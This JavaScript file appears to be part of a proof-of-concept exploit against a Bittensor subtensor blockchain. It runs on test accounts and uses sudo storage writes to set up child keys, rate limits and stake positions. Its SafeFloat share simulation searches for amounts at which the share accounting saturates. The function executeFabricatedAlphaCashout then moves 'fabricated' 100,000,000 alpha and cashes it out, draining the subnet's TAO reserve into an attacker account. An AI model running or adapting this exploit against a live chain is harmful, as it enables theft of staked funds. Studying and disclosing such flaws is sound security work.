async function setImmediateChildRelation(alice, charlie, dave) {
  const childMap = api.query.subtensorModule.childKeys;
  const parentMap = api.query.subtensorModule.parentKeys;
  const childBefore = await childMap(charlie, NETUID);
  const parentBefore = await parentMap(dave, NETUID);
  assert.equal(childBefore.length, 0, "ChildKeys(Charlie, 64) must start empty");
  assert.equal(parentBefore.length, 0, "ParentKeys(Dave, 64) must start empty");

  const entries = [
    [
      childMap.key(charlie, NETUID),
      api.createType(childBefore.toRawType(), [[U64_MAX.toString(), dave]]).toHex(),
    ],
    [
      parentMap.key(dave, NETUID),
      api.createType(parentBefore.toRawType(), [[U64_MAX.toString(), charlie]]).toHex(),
    ],
  ];
  console.log("child/parent raw storage entries:", JSON.stringify(entries));
  const result = await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage(entries)),
    "Alice sudo writes ChildKeys and ParentKeys",
    { expectSudoSuccess: true }
  );
  const view = await api.at(result.blockHash);
  const [children, parents] = await Promise.all([
    view.query.subtensorModule.childKeys(charlie, NETUID),
    view.query.subtensorModule.parentKeys(dave, NETUID),
  ]);
  assert.equal(children.length, 1);
  assert.equal(children[0][0].toBigInt(), U64_MAX);
  assert.equal(children[0][1].toString(), dave);
  assert.equal(parents.length, 1);
  assert.equal(parents[0][0].toBigInt(), U64_MAX);
  assert.equal(parents[0][1].toString(), charlie);
  console.log("verified immediate child relation at block:", result.blockNumber.toString());
}

async function setWeightsRateLimitToZero(alice) {
  const storage = api.query.subtensorModule.weightsSetRateLimit;
  const before = (await storage(NETUID)).toBigInt();
  const result = await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage([
      [storage.key(NETUID), storageValueHex("u64", 0)],
    ])),
    "Alice sudo sets SN64 weights rate limit to zero",
    { expectSudoSuccess: true }
  );
  const view = await api.at(result.blockHash);
  const after = (await view.query.subtensorModule.weightsSetRateLimit(NETUID)).toBigInt();
  assert.equal(after, 0n, "SN64 weights rate limit must be zero");
  console.log("weights rate limit adjusted:", `before=${before}`, `after=${after}`);
}

async function ensureDaveValidatorPermit(alice, dave) {
  const uidOption = await api.query.subtensorModule.uids(NETUID, dave);
  assert.ok(uidOption.isSome, "Dave must be registered before the permit epoch");
  const uid = uidOption.unwrap().toNumber();
  let permits = await api.query.subtensorModule.validatorPermit(NETUID);
  if (permits[uid]?.valueOf()) {
    console.log("Dave already has validator permit at UID:", uid);
    return;
  }

  const anchor = (await api.query.subtensorModule.lastEpochBlock(NETUID)).toBigInt();
  const epochIndex = (await api.query.subtensorModule.subnetEpochIndex(NETUID)).toBigInt();
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage([
      [
        api.query.subtensorModule.tempo.key(NETUID),
        storageValueHex("u16", TEMPO),
      ],
    ])),
    "Alice sudo sets tempo to 10 for Dave permit epoch",
    { expectSudoSuccess: true }
  );
  const epoch = await waitForNextEpoch(anchor, epochIndex);
  permits = await epoch.view.query.subtensorModule.validatorPermit(NETUID);
  assert.equal(permits[uid]?.valueOf(), true, "Dave did not receive a validator permit at the preparatory epoch");
  console.log(
    "Dave validator permit granted:",
    `uid=${uid}`,
    `block=${epoch.blockNumber}`,
    `epochIndex=${epoch.epochIndex}`
  );
}

async function stakeBobCharlieExactly(bob, charlie, ferdie) {
  const before = await getStake(api, charlie, bob.address);
  assert.ok(before <= TARGET_STAKE, `Bob/Charlie already exceeds target: ${before}`);
  const needed = TARGET_STAKE - before;
  console.log("Bob/Charlie before requested stake:", before.toString(), "needed:", needed.toString());

  if (needed > 0n) {
    const quoteHash = await api.rpc.chain.getBlockHash();
    const quoteView = await api.at(quoteHash);
    const free = (await quoteView.query.system.account(bob.address)).data.free.toBigInt();
    let low = 0n;
    let high = free - RAO_PER_TAO;
    assert.ok(high > 0n, "Bob lacks spendable TAO for staking");
    assert.ok(await quoteAlpha(quoteView, high) >= needed, "Bob cannot buy the required alpha");
    while (high - low > 1n) {
      const midpoint = (low + high) / 2n;
      if (await quoteAlpha(quoteView, midpoint) <= needed) low = midpoint;
      else high = midpoint;
    }
    console.log(
      "stake quote:",
      `block=${quoteHash}`,
      `taoRao=${low}`,
      `alphaRao=${await quoteAlpha(quoteView, low)}`
    );
    await submitAndWait(
      bob,
      api.tx.subtensorModule.addStake(charlie, NETUID, low.toString()),
      "Bob stakes slippage-adjusted TAO to Charlie"
    );
  }

  let current = await getStake(api, charlie, bob.address);
  if (current !== TARGET_STAKE) {
    await submitAndWait(
      bob,
      api.tx.subtensorModule.addStake(charlie, NETUID, TOP_UP_TAO.toString()),
      "Bob adds correction top-up to Charlie"
    );
    current = await getStake(api, charlie, bob.address);
    assert.ok(current > TARGET_STAKE, `correction top-up did not cross target: ${current}`);
    await submitAndWait(
      bob,
      api.tx.subtensorModule.removeStake(
        charlie,
        NETUID,
        (current - TARGET_STAKE).toString()
      ),
      "Bob removes exact alpha excess from Charlie"
    );
  }

  const finalStake = await getStake(api, charlie, bob.address);
  assert.equal(finalStake, TARGET_STAKE, "Bob/Charlie stake target after correction");
  assert.equal(await getStake(api, charlie, ferdie), 0n, "Ferdie/Charlie should still be empty");
  console.log("verified Bob/Charlie stake:", finalStake.toString());
}

async function quoteAlpha(view, tao) {
  const quote = await view.call.swapRuntimeApi.simSwapTaoForAlpha(NETUID, tao.toString());
  return BigInt((quote.alphaAmount ?? quote.alpha_amount).toString());
}

async function waitForNextEpoch(anchor, epochIndexBefore) {
  const deadline = Date.now() + 180_000;
  while (Date.now() < deadline) {
    const header = await api.rpc.chain.getHeader();
    const blockHash = header.hash;
    const view = await api.at(blockHash);
    const [lastEpochBlock, epochIndex] = await Promise.all([
      view.query.subtensorModule.lastEpochBlock(NETUID),
      view.query.subtensorModule.subnetEpochIndex(NETUID),
    ]);
    if (lastEpochBlock.toBigInt() > anchor && epochIndex.toBigInt() > epochIndexBefore) {
      return {
        view,
        blockHash,
        blockNumber: header.number.toBigInt(),
        epochIndex: epochIndex.toBigInt(),
      };
    }
    await delay(500);
  }
  throw new Error(`subnet ${NETUID} epoch did not fire within 180 seconds`);
}

async function waitForDaveDividend(charlie, dave, bob, ferdie, label) {
  let before = await positionState(charlie, dave, bob, ferdie);
  let anchor = (await api.query.subtensorModule.lastEpochBlock(NETUID)).toBigInt();
  let epochIndex = (await api.query.subtensorModule.subnetEpochIndex(NETUID)).toBigInt();

  for (let attempt = 1; attempt <= 24; attempt += 1) {
    const epoch = await waitForNextEpoch(anchor, epochIndex);
    const after = await positionStateAt(epoch.view, charlie, dave, bob, ferdie);
    const daveEmission = after.daveTotal - before.daveTotal;
    console.log(
      `${label}: epoch ${attempt}`,
      `block=${epoch.blockNumber}`,
      `epochIndex=${epoch.epochIndex}`,
      `DavePoolCredit=${daveEmission}`,
      `before=${formatState(before)}`,
      `after=${formatState(after)}`
    );
    if (daveEmission > 0n) {
      return { before, after, daveEmission, epoch };
    }
    before = after;
    anchor = (await epoch.view.query.subtensorModule.lastEpochBlock(NETUID)).toBigInt();
    epochIndex = epoch.epochIndex;
  }
  throw new Error(`${label}: Dave received no positive pool-wide dividend across 24 epochs`);
}

async function boostPendingValidatorEmission(alice, label) {
  const before = (await api.query.subtensorModule.pendingValidatorEmission(NETUID)).toBigInt();
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.system.setStorage([[
      api.query.subtensorModule.pendingValidatorEmission.key(NETUID),
      storageValueHex("u64", PENDING_VALIDATOR_EMISSION_BOOST),
    ]])),
    `Alice sudo prepares ${label} with non-zero SN64 validator emission`,
    { expectSudoSuccess: true }
  );
  const after = (await api.query.subtensorModule.pendingValidatorEmission(NETUID)).toBigInt();
  assert.ok(after >= PENDING_VALIDATOR_EMISSION_BOOST, `${label}: pending validator emission boost was not stored`);
  console.log(
    `${label}: pending validator emission prepared`,
    `before=${before}`,
    `after=${after}`
  );
}

async function executeFabricatedAlphaCashout(ferdie, charlie, dave) {
  const before = await readCashoutState(ferdie.address, charlie, dave);
  assert.equal(before.ferdieDave, U64_MAX, "cash-out requires saturated Ferdie/Dave quote");

  await submitAndWait(
    ferdie,
    api.tx.subtensorModule.moveStake(
      dave,
      charlie,
      NETUID,
      NETUID,
      FABRICATED_ALPHA_MOVE.toString()
    ),
    "Ferdie moves fabricated 100,000,000 alpha Dave -> Charlie"
  );
  const afterMove = await readCashoutState(ferdie.address, charlie, dave);
  assert.equal(afterMove.daveTotal, 0n, "Dave real pool value must saturate to zero on fabricated move");
  assert.ok(
    afterMove.ferdieCharlie >= before.ferdieCharlie + FABRICATED_ALPHA_MOVE,
    "Charlie/Ferdie was not credited the full fabricated alpha amount"
  );
  assert.ok(
    afterMove.charlieTotal >= before.charlieTotal + FABRICATED_ALPHA_MOVE,
    "Charlie pool total was not credited the fabricated alpha amount"
  );
  console.log(
    "fabricated alpha created:",
    `amount=${FABRICATED_ALPHA_MOVE}`,
    `DaveTotal=${before.daveTotal}->${afterMove.daveTotal}`,
    `CharlieTotal=${before.charlieTotal}->${afterMove.charlieTotal}`,
    `FerdieCharlie=${before.ferdieCharlie}->${afterMove.ferdieCharlie}`
  );

  const quote = await api.call.swapRuntimeApi.simSwapAlphaForTao(
    NETUID,
    FABRICATED_ALPHA_MOVE.toString()
  );
  const quotedTao = BigInt((quote.taoAmount ?? quote.tao_amount).toString());
  console.log("100M-alpha pre-cash-out quote:", `taoRao=${quotedTao}`, `raw=${quote}`);
  assert.ok(quotedTao > 0n, "100M-alpha cash-out quote must be positive");

  await submitAndWait(
    ferdie,
    api.tx.subtensorModule.removeStake(charlie, NETUID, FABRICATED_ALPHA_MOVE.toString()),
    "Ferdie removes fabricated 100,000,000 alpha from Charlie"
  );
  const afterRemove = await readCashoutState(ferdie.address, charlie, dave);
  assert.ok(afterRemove.subnetTao < afterMove.subnetTao, "SN64 TAO reserve did not decrease");
  assert.ok(afterRemove.free > afterMove.free, "Ferdie free TAO did not increase");
  const reserveLoss = afterMove.subnetTao - afterRemove.subnetTao;
  const freeGain = afterRemove.free - afterMove.free;
  console.log(
    "fabricated alpha cashed out:",
    `quotedTao=${quotedTao}`,
    `reserveLoss=${reserveLoss}`,
    `ferdieFreeGainAfterFee=${freeGain}`,
    `subnetTao=${afterMove.subnetTao}->${afterRemove.subnetTao}`,
    `subnetAlphaIn=${afterMove.subnetAlphaIn}->${afterRemove.subnetAlphaIn}`,
    `subnetAlphaOut=${afterMove.subnetAlphaOut}->${afterRemove.subnetAlphaOut}`
  );
  return {
    saturatedQuote: before.ferdieDave,
    fabricatedAlpha: FABRICATED_ALPHA_MOVE,
    quotedTao,
    reserveLoss,
    freeGain,
    reserveBefore: afterMove.subnetTao,
    reserveAfter: afterRemove.subnetTao,
  };
}

async function readCashoutState(coldkey, charlie, dave) {
  const [ferdieCharlie, ferdieDave, charlieTotal, daveTotal, subnetTao, subnetAlphaIn, subnetAlphaOut, account] =
    await Promise.all([
      getStake(api, charlie, coldkey),
      getStake(api, dave, coldkey),
      api.query.subtensorModule.totalHotkeyAlpha(charlie, NETUID).then((value) => value.toBigInt()),
      api.query.subtensorModule.totalHotkeyAlpha(dave, NETUID).then((value) => value.toBigInt()),
      api.query.subtensorModule.subnetTAO(NETUID).then((value) => value.toBigInt()),
      api.query.subtensorModule.subnetAlphaIn(NETUID).then((value) => value.toBigInt()),
      api.query.subtensorModule.subnetAlphaOut(NETUID).then((value) => value.toBigInt()),
      api.query.system.account(coldkey),
    ]);
  return {
    ferdieCharlie,
    ferdieDave,
    charlieTotal,
    daveTotal,
    subnetTao,
    subnetAlphaIn,
    subnetAlphaOut,
    free: account.data.free.toBigInt(),
  };
}

async function positionState(charlie, dave, bob, ferdie) {
  const hash = await api.rpc.chain.getBlockHash();
  return positionStateAt(await api.at(hash), charlie, dave, bob, ferdie);
}

async function positionStateAt(view, charlie, dave, bob, ferdie) {
  const [bobCharlie, bobDave, ferdieCharlie, ferdieDave, charlieTotal, daveTotal] = await Promise.all([
    getStake(view, charlie, bob),
    getStake(view, dave, bob),
    getStake(view, charlie, ferdie),
    getStake(view, dave, ferdie),
    view.query.subtensorModule.totalHotkeyAlpha(charlie, NETUID).then((value) => value.toBigInt()),
    view.query.subtensorModule.totalHotkeyAlpha(dave, NETUID).then((value) => value.toBigInt()),
  ]);
  return { bobCharlie, bobDave, ferdieCharlie, ferdieDave, charlieTotal, daveTotal };
}

async function getStake(view, hotkey, coldkey, netuid = NETUID) {
  const info = await view.call.stakeInfoRuntimeApi.getStakeInfoForHotkeyColdkeyNetuid(
    hotkey,
    coldkey,
    netuid
  );
  return info.isNone ? 0n : BigInt(info.unwrap().stake.toString());
}

function formatState(state) {
  return Object.entries(state).map(([key, value]) => `${key}=${value}`).join(" ");
}

function storageValueHex(type, value) {
  return u8aToHex(api.createType(type, value).toU8a());
}

async function readSameSubnetTransferFloor() {
  const minimumTao = BigInt(api.consts.subtensorModule.initialMinTransfer.toString());
  const price = BigInt((await api.call.swapRuntimeApi.currentAlphaPrice(NETUID)).toString());
  assert.ok(price > 0n, "SN64 current alpha price must be positive");
  const minimumAlpha = (minimumTao * RAO_PER_TAO + price - 1n) / price;
  assert.equal((minimumAlpha * price) / RAO_PER_TAO, minimumTao, "minimum alpha must reach transfer floor");
  assert.ok(
    minimumAlpha === 0n || ((minimumAlpha - 1n) * price) / RAO_PER_TAO < minimumTao,
    "computed alpha transfer floor must be minimal"
  );
  console.log(
    "same-subnet transfer floor:",
    `minimumTao=${minimumTao}`,
    `currentAlphaPrice=${price}`,
    `minimumAlpha=${minimumAlpha}`
  );
  return { minimumTao, price, minimumAlpha };
}

function selectSeedAmount(observedDaveValue, minimumTransfer) {
  const initialShare = safeFloatFromU64(MOVE_TO_DAVE);
  const maximum = 100_000_001n;
  for (let transfer = minimumTransfer; transfer <= maximum; transfer += 1n) {
    const first = simulateShareUpdate(
      observedDaveValue,
      initialShare,
      { mantissa: 0n, exponent: 0 },
      transfer,
      true
    );
    const second = simulateShareUpdate(
      first.value,
      first.denominator,
      first.share,
      transfer - 1n,
      false
    );
    const ferdieValue = safeFloatGetValue(second.value, second.share, second.denominator);
    const bobValue = safeFloatGetValue(second.value, initialShare, second.denominator);
    if (ferdieValue !== 1n || bobValue !== second.value - 1n) continue;

    const bobExit = simulateShareUpdate(
      second.value,
      second.denominator,
      initialShare,
      bobValue,
      false
    );
    const bobAfter = safeFloatGetValue(bobExit.value, bobExit.share, bobExit.denominator);
    const ferdieAfter = safeFloatGetValue(bobExit.value, second.share, bobExit.denominator);
    if (bobExit.value === 1n && bobAfter === 0n && ferdieAfter >= 1n) {
      return { transfer, moveBack: transfer - 1n, bobExit: bobValue };
    }
  }
  throw new Error(`no valid live seed found for Dave pool value ${observedDaveValue}`);
}

function simulateShareUpdate(value, denominator, share, amount, add) {
  const sharesPerUpdate = safeFloatMulDiv(
    safeFloatFromU64(amount),
    denominator,
    safeFloatFromU64(value)
  );
  let nextDenominator = add
    ? safeFloatAdd(denominator, sharesPerUpdate)
    : safeFloatSub(denominator, sharesPerUpdate);
  let nextShare = add
    ? safeFloatAdd(share, sharesPerUpdate)
    : safeFloatSub(share, sharesPerUpdate);
  const nextValue = add ? value + amount : value > amount ? value - amount : 0n;
  if (!add
    && nextShare.mantissa !== 0n
    && safeFloatGetValue(nextValue, nextShare, nextDenominator) === 0n) {
    nextDenominator = safeFloatSub(nextDenominator, nextShare);
    nextShare = { mantissa: 0n, exponent: 0 };
  }
  return { value: nextValue, denominator: nextDenominator, share: nextShare };
}

function safeFloatFromU64(value) {
  return safeFloatNormalize(value, 0);
}

function safeFloatNormalize(mantissa, exponent) {
  if (mantissa === 0n) return { mantissa: 0n, exponent: 0 };
  const minimum = SAFE_FLOAT_MAX / 10n;
  while (mantissa > SAFE_FLOAT_MAX) {
    mantissa /= 10n;
    exponent += 1;
  }
  while (mantissa <= minimum) {
    mantissa *= 10n;
    exponent -= 1;
  }
  return { mantissa, exponent };
}

function safeFloatMulDiv(left, numerator, denominator) {
  assert.notEqual(denominator.mantissa, 0n, "SafeFloat division by zero");
  return safeFloatNormalize(
    (left.mantissa * numerator.mantissa) / denominator.mantissa,
    left.exponent + numerator.exponent - denominator.exponent
  );
}

function safeFloatAdd(left, right) {
  if (left.mantissa === 0n) return { ...right };
  if (right.mantissa === 0n) return { ...left };
  if (left.exponent >= right.exponent) {
    return safeFloatNormalize(
      left.mantissa + right.mantissa / safeFloatPower(left.exponent - right.exponent),
      left.exponent
    );
  }
  return safeFloatNormalize(
    left.mantissa / safeFloatPower(right.exponent - left.exponent) + right.mantissa,
    right.exponent
  );
}

function safeFloatSub(left, right) {
  if (right.mantissa === 0n) return { ...left };
  if (left.exponent >= right.exponent) {
    const aligned = right.mantissa / safeFloatPower(left.exponent - right.exponent);
    return safeFloatNormalize(left.mantissa > aligned ? left.mantissa - aligned : 0n, left.exponent);
  }
  const aligned = left.mantissa / safeFloatPower(right.exponent - left.exponent);
  return safeFloatNormalize(aligned > right.mantissa ? aligned - right.mantissa : 0n, right.exponent);
}

function safeFloatPower(exponentDifference) {
  if (exponentDifference > 22) return SAFE_FLOAT_MAX * 10n;
  return 10n ** BigInt(exponentDifference);
}

function safeFloatGetValue(value, share, denominator) {
  if (denominator.mantissa === 0n) return 0n;
  const result = safeFloatMulDiv(safeFloatFromU64(value), share, denominator);
  const integer = result.exponent >= 0
    ? result.mantissa * (10n ** BigInt(result.exponent))
    : result.mantissa / (10n ** BigInt(-result.exponent));
  return integer > U64_MAX ? U64_MAX : integer;
}

async function submitAndWait(signer, tx, label, { expectSudoSuccess = false } = {}) {
  console.log(`${label}: submitting ${tx.method.section}.${tx.method.method}`);
  return new Promise((resolve, reject) => {
    let unsubscribe;
    let settled = false;
    const timeout = setTimeout(() => finish(reject, new Error(`${label}: timed out`)), 180_000);

    const finish = (callback, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      unsubscribe?.();
      callback(value);
    };

    tx.signAndSend(signer, ({ status, events, dispatchError }) => {
      if (!status.isInBlock || settled) return;
      if (dispatchError) {
        finish(reject, new Error(`${label}: ${formatDispatchError(dispatchError)}`));
        return;
      }

      if (expectSudoSuccess) {
        const sudoEvent = events.find(({ event }) => api.events.sudo.Sudid.is(event));
        if (!sudoEvent) {
          finish(reject, new Error(`${label}: missing sudo.Sudid event`));
          return;
        }
        const sudoResult = sudoEvent.event.data[0];
        if (sudoResult.isErr) {
          finish(reject, new Error(`${label}: sudo inner call failed: ${formatDispatchError(sudoResult.asErr)}`));
          return;
        }
      }

      const eventSummary = events
        .filter(({ event }) => event.section !== "system" && event.section !== "transactionPayment")
        .filter(({ event }) => tx.method.method !== "rootRegister" || event.method !== "SetChildren")
        .map(({ event }) => `${event.section}.${event.method}(${event.data})`)
        .join(" | ");
      console.log(
        `${label}: included`,
        `tx=${tx.hash}`,
        `block=${status.asInBlock}`,
        eventSummary
      );
      api.rpc.chain.getHeader(status.asInBlock)
        .then((header) => finish(resolve, {
          blockHash: status.asInBlock,
          blockNumber: header.number.toBigInt(),
          events,
        }))
        .catch((error) => finish(reject, error));
    }).then((fn) => {
      unsubscribe = fn;
      if (settled) unsubscribe();
    }).catch((error) => finish(reject, error));
  });
}

function formatDispatchError(dispatchError) {
  if (!dispatchError.isModule) return dispatchError.toString();
  const decoded = api.registry.findMetaError(dispatchError.asModule);
  return `${decoded.section}.${decoded.name}: ${decoded.docs.join(" ")}`;
}

function delay(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
